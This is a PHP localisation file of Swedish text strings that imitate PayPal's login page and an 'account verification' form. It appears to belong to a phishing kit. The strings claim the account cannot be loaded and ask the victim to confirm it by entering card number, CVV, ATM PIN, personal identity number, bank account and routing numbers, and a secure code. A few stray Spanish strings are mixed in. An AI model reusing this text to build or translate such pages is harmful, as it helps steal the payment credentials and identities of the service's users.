<?php  

$confirmbutton = "bekräfta";
$confirmyourinfo = "Du måste bekräfta din information för att kunna åtgärda problemet och tillgång till ditt konto";
$unabletoload = "Tillfälligt inte kan ladda ditt konto.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Alla rättigheter förbehållna.";
$wrong = "Viss information som du angav är inte rätt.";
$titlerr = "Fel: Logga in ";
$confirm = "Bekräfta ditt konto Använd den hur du vill";
$topp = "Din säkerhet är vår högsta prioritet";
$secondarycred = "Sekundär Kreditkort (tillval)";
$primarycred = "Primär kreditkort";
$thiscardis = "Detta kort är VBV / MSC";

$page="sv_SE";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$country_selector = "country sweden";
$top_title = "Betala, överför och ta emot pengar på nätet – PayPal Sverige";
$small_with_helper_input_0 = "Ange en giltig e-postadress";
$small_with_helper_input_1 = "Lösenord krävs";
$login_email_input_0 = "E-postadress";
$passwordRecovery1_a_0 = "Glömt din e-postadress?";
$login_password_input_0 = "Lösenord";
$passwordRecovery2_a_0 = "Glömt lösenordet?";
$login_button_a_0 = "Logga in";
$signup_button_a_0 = "Skapa konto";
$header_buy_a_0 = "Köpa";
$header_sell_a_0 = "Sälja";
$header_send_a_0 = "Överföra";
$header_business_a_0 = "Företag";
$signup_button_inner_a_0 = "Skapa konto";
$hero_h1_0 = "Trygg och smidig betalning.";
$SignUp_consumer_hero_input_0 = "Skapa ett konto gratis";
$signup_subline_p_0 = "Har du företag? Skapa ett företagskonto";
$icon_help_a_0 = "Hjälp";
$icon_contact_a_0 = "Kontakta oss";
$icon_search_button_0 = "Search";
$_large_h2_n1_0 = "Snabbt och enkelt.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Det går smidigt att ta emot kort.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Överför pengar till vem du vill.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Be om pengar, lite snabbt.";
$contentPara_p_n1_0 = "Miljontals kunder över hela världen använder PayPal av en enda orsak – det är enkelt. Du behöver bara skriva in din e-postadress och ditt PayPal-lösenord för att bekräfta betalningar. Det går mycket snabbare än att leta fram korten eller bankdosan! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Du kan snabbt och enkelt föra över pengar till andra, du behöver bara ha deras e-postadress. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Du kan på ett smidigt och trevligt sätt be att få pengar som någon är skyldig dig. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Börja ta emot kortbetalningar snabbt och enkelt. Vi har tagit hand om allt, så du kan komma i gång redan idag. Enklare kan det inte bli. ";
$contentLink_a_n1_0 = "Betalning i nätbutiker";
$contentLink_a_n1_1 = "";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Överför pengar";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Be om pengar";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Ta emot betalningar på din webbplats";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Skicka digitala fakturor";
$closingHeadline_headline_large_p_0 = "Trygg och smidig betalning. ";
$btn_closing_cta_center_block_span4_a_0 = "Skapa ett konto gratis";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Hjälp";
$footer_footer_main_secondaryLink_li[1] = "Kontakta oss";
$footer_footer_main_secondaryLink_li[2] = "Avgifter";
$footer_footer_main_secondaryLink_li[3] = "Säkerhet";
$footer_footer_main_secondaryLink_li[4] = "Funktioner";
$footer_footer_main_secondaryLink_li[5] = "Butiker";
$footer_footer_main_secondaryLink_li[6] = "Ändra land eller språk";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Om PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Jobb";
$footer_footer_secondary_secondaryLink_li[2] = "Tradera";
$footer_footer_secondary_secondaryLink_li[3] = "Utvecklare";
$footer_footer_secondary_secondaryLink_li[4] = "Sekretess";
$footer_footer_secondary_secondaryLink_li[5] = "Partner";
$footer_footer_secondary_secondaryLink_li[6] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999–".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Sekretess";
$footer_footer_tertiary_secondaryLink_li[2] = "Användaravtal";

$top_title2 = "Fel – Logga in Sverige - PayPal";
$alert_alert_warning_div_0 = "Du måste ange både e-postadress och lösenord. Försök igen.";
$loginheadline_p_0 = "Logga in på kontot";
$error_span_0 = "E-postadress";
$error_span_1 = "Lösenord";
$btn_large_input_0 = "Logga in";
$pwrLinkoldflow_a_0 = "Har du glömt din e-postadress eller ditt lösenord?";
$btn_btn_secondary_large_a_0 = "Skapa konto gratis";
$headline_p_0 = "Trygg och smidig betalning.<SPAN class=headline-content>Betala med saldo eller kopplat kort. Oavsett vilket du väljer behöver du bara skriva in din e-postadress och ditt lösenord när du betalar.</SPAN>";
$headline_p_1 = "Enkelt. Och oftast avgiftsfritt.<SPAN class=headline-content>Det är gratis att skapa ett PayPal-konto och du betalar ingen avgift när du köper i svenska kronor, oavsett hur du väljer att betala.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Om oss";
$footer_li_footer_li[1] = "Kontakta oss";
$footer_li_footer_li[2] = "Avgifter";
$footer_li_footer_li[3] = "Globalt";
$footer_li_footer_li[4] = "Webbplatsfeedback";
$legal_p_0 = "Copyright © 1999–".$copyright." PayPal. Med ensamrätt.";

$charset = "UTF-8";
$profupdate = "Profile Update - PayPal";
$processing = "Loggar du in säkert";
$opay = "Inloggning - PayPal";
$ifno = "Om den här sidan visas i mer än 5 sekunder,";
$clickhere = "klicka här";
$reload = "för att ladda om.";
$logout = "Logga ut";
$help = "Hjälp";
$s_center = "Säkerhet och skydd";
$myacc = "Mitt konto";
$over = "Översikt";
$addfound = "Lägg till pengar";
$retirar = "Drag";
$banktf = "Överföring till bankkonto";
$history = "Historia";
$bsearch = "enkel sökning";
$dhistory = "Hämta Historia";
$resolu = "Upplösning Centrum";
$opencase = "Visa öppna ärenden";
$guides = "Guider";
$prof = "Profil";
$addemail = "Lägg till eller redigera e-post";
$addbank = "Lägg till eller redigera bankkonto";
$addcard = "Lägg till eller redigera kreditkort";
$addadr = "Lägg till eller Redigera Postadress";
$sendmoney = "Skicka pengar";
$reqmoney = "begär pengar";
$mservices = "Merchant Services";
$autools = "Auktionsverktyg";
$stra = "Secure Transaction";
$puf = "Profil Update";
$pip = "Personlig information Profile";
$acu = "Fyll i dina uppgifter så noggrant som möjligt.";
$accu = "Se till att du anger informationen korrekt och i enlighet med de format som krävs.";
$filla = "Fyll i alla obligatoriska fält.";
$rfield = "Obligatoriskt fält";
$ffPrenom = "Förnamn";
$ffNom = "Efternamn";
$dateness = "Födelsedatum";
$month = "månad";
$day = "dag"; 
$year = "år";
$adr1 = "Adress Linje 1";
$adr2 = "Adress Linje 2";
$city = "Stad";
$state = "State";
$zip = "Postnummer";
$country = "Land";
$scountry = "- Välj land -";
$hpn = "Hem telefonnummer";
$acpnum = "Detta nummer kommer att användas för att kontakta dig om säkerhetsåtgärder och/eller andra frågor om ditt PayPal-konto.";
$ccprof = "Kredit/betalkort Profile";
$damelacc = "Skriv in kortinformation så exakt som möjligt.";
$damelacb = "För kortnummer, ange siffror bara snälla, inga streck eller mellanslag.";
$Nomdutitulairedelacarte = "Kortets namn";
$ccnumbr = "Kortnummer";
$expbr = "Utgångsdatum";
$cvv = "Card Verification Number";
$hcvv = "Hjälp att hitta din Card Verification Number";
$atmm = "Din ATM PIN";
$ssn = "Personnummer";
$routing="Bank Routing Number";
$account="Bankkontonummer";
$hrouting="Hjälp att hitta din Bank Routing Number";
$haccount="Hjälp att hitta ditt bankkontonummer";
$codepersonel="Secure kod";
$IDTYPE = "Välj typ av Id";
$Passport="Passport";
$Card_Identification="Identitetskort";
$Driving_License="KÖRKORT";
$for1 = "För din säkerhet, vi verifiera kreditkortsinformation.";
$for2 = "Processen tar normalt ca 30 sekunder, men det kan ta längre tid under vissa tider på dagen. klicka";
$for3 = "för att uppdatera dina uppgifter.";
$spo = "Spara profil";
$t1 = "mer information";
$t2 = "Om oss";
$t3 = "webbplats yttrande";
$t4 = "Avgifter";
$t5 = "Integritets";
$t6 = "Säkerhetscenter";
$t7 = "Kontakta oss";
$t8 = "juridiska avtal";
$t9 = "Världen";
$t10 = "Jobb";
$t11 = "Merchant Services";
$t12 = "vår blogg";
$t13 = "Labs";
$t14 = "Hänvisningar";
$t15 = "Site Map";
$t16 = "eBay";
$t17 = "gemenskapen";
$fdic = "Information om FDIC genomslag försäkring";
$myvar3 = "Fyll i formuläret nedan för att uppdatera din profilinformation och återställa din kontoåtkomst.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("Skriv in ditt förnamn"
,"Ogiltig Förnamn" //--------
,"Ange din Efternamn"
,"Ogiltig Efternamn" //--------
,"Välj ett giltigt födelsemånad." //--------4
,"Välj ett giltigt födelsedagen." //--------
,"Välj ett giltigt födelseår." //--------
,"Ange din adress"
,"Ogiltig adress" //--------8
,"Ogiltig adress" //--------
,"Skriv in namnet på din stad"
,"Ange ett giltigt namn stad." //--------
,"Ange ett giltigt namn stad." //--------12
,"Välj land"
,"Ange din postnummer"
,"Ogiltigt postnummer." //--------15
,"Ange din Telefonnummer"
,"Ange bara antalet"
,"Ange ett giltigt telefonnummer" //--------
,"Ange ett giltigt namn på kortinnehavaren" //--------19
,"Kortnumret är i ett ogiltigt format"  ////--------
,"Kreditkortsnumret är ogiltigt"  //--------
,""//--------22
,""//--------
,"Ange bara antalet"
,"Välj slutdagen - månad -"
,"Välj slutdagen - år -"
,"Ange din CVV"
,"Ange ett giltigt Cvv/Cvv2 för ditt kort."//--------
,"Ogiltig Cvv/Cvv2" //--------
,"Ange din ATM PIN"
,"Ange ett giltigt ATM PIN" //--------
,"Ange ett giltigt ATM PIN" //--------
,"Ange din Social Security Number"
,"Ogiltig personnummer."
,"Ogiltig personnummer."
,"Social Security Number bara antalet"
,"Ange din Secure Code"
,"Ogiltig Secure Code");
$allcountry1 = "Dondequiera que vives existe PayPal.";
$allcountry2 = "Nuestros servicios están disponibles en 193 países, en los principales idiomas y en 26 divisas. Haz compras y recibe pagos de manera fácil y segura sin importar las fronteras internacionales. ";
$One_moment = "Ett ögonblick...";



$your_money = "Få ut mer av dina pengar";
$your_money_p = "Ditt PayPal-konto ger dig en säkrare, snabbare och bekvämare sätt att betala på nätet och i mobilen. Lagra dina finansiella detaljer säkert med oss ​​sedan använda ditt konto för att handla, föra över pengar eller sälja dina grejer för att tjäna lite extra pengar - allt på bara ett par klick.";
$websites = "Handla på miljontals webbplatser";
$websites_p = "PayPal är tillgänglig på miljontals webbplatser över hela världen. Så oavsett om du köper från de största återförsäljarna eller de minsta specialister kan du handla utan att dela dina uppgifter och hastighet genom kassan. Och beroende på vilken enhet du använder, kommer ditt PayPal-upplevelsen vara lika snabb och bekväm.";
$Simply_secure = "bara att säkra";
$Simply_secure_p = "Säkerhet är kärnan i allt vi gör. Oavsett om det är att skydda din ekonomiska uppgifter eller dina inköp, sätter vi din säkerhet och trygghet först. Det är därför vi använder ledande kryptering och bedrägeribekämpning teknik, varför vi övervakar transaktioner 24 timmar om dygnet och varför vi kan hjälpa dig att få pengarna tillbaka om ditt köp inte kommer fram eller inte matchar beskrivningen.";
$ex_date_info = "Vänligen ge oss ditt kort utgångsdatum (MM/ÅÅÅÅ).";
$ex_date_empty = "Vänligen ge oss ditt kort utgångsdatum.";
$ex_date_format = "Ange ett giltigt utgångsdatum (MM/ÅÅÅÅ).";
$cardholder_info = "Använd ditt namn som visas på ditt kort";
$card_info = "Skriv in ditt kortnummer";
$card_format = "Kortnummer är ogiltigt";
$atm_info = "Ange atm pin för detta kort.";
$account_info = "Ange ditt kontonummer";
$account_empty = "Ange din bankkontonummer för att verifiera ditt konto";
$account_format = "Vänligen ange ett giltigt kontonummer";
$routing_info = "Ange din bank clearingnummer";
$routing_empty = "Ange din bank clearingnummer att kontrollera ditt konto";
$routing_format = "Vänligen ange ett giltigt bank clearingnummer";
$first_name = "Ditt förnamn";
$first_name_info = "Använd ditt juridiska förnamn som visas på ditt körkort, Försäkringskassan eller pass.";
$first_name_empty = "Vi behöver ditt juridiska förnamn för att kontrollera ditt konto.";
$last_name = "Ditt efternamn";
$last_name_info = "Använd ditt juridiska efternamn som visas på ditt körkort, Försäkringskassan eller pass.";
$last_name_empty = "Vi behöver ditt juridiska efternamn för att verifiera ditt konto.";
$Birth_date = "Födelsedatum";
$Birth_date_empty ="Vänligen uppge ditt födelsedatum.";
$Birth_date_format = "Ange ett giltigt datum (DD/MM/ÅÅÅÅ).";
$Birth_date_info = "Vänligen uppge ditt födelsedatum (DD/MM/ÅÅÅÅ).";
$Address1 = "Adressrad 1";
$Address1_empty = "Vi behöver en giltig adress för att verifiera ditt konto.";
$Address1_info = "Vi kan inte acceptera postboxar eller företagsadresser.";
$Address2 = "Adressrad 2";
$City = "Stad";
$City_empty = "Vi behöver en stad/ort att kontrollera ditt konto.";
$Postcode = "Postnummer";
$Postcode_empty = "Vi behöver ett postnummer för att skapa ett nytt konto för dig.";
$Postcode_format = "Kontrollera ditt postnummer för stavfel, inte formatet inte ser bra ut.";
$fone = "Din telefonnummer";
$fone_empty = "Vi behöver ditt telefonnummer för att verifiera ditt konto.";
$fone_format = "Kontrollera ditt telefonnummer för stavfel, inte formatet inte ser bra ut.";
$fone_info = "Din telefonnummer (vänligen använd endast siffror)";
$verifyaccount = "Verifiera ditt konto";
$Ownb = "Äga ett företag?";
$hh1 = "Dina säkra uppgifter";
$hh2 = "Dina personuppgifter";
$pp1 = "Vi behöver dina giltiga säkra uppgifter för att verifiera ditt konto.";
$pp2 = "Vi behöver lite information om dig innan vi kan verifiera ditt konto.";


$type1="Start";
$type2="Mobil";
$button_continue="Fortsätt";
$button_validate="Verifiera";
?>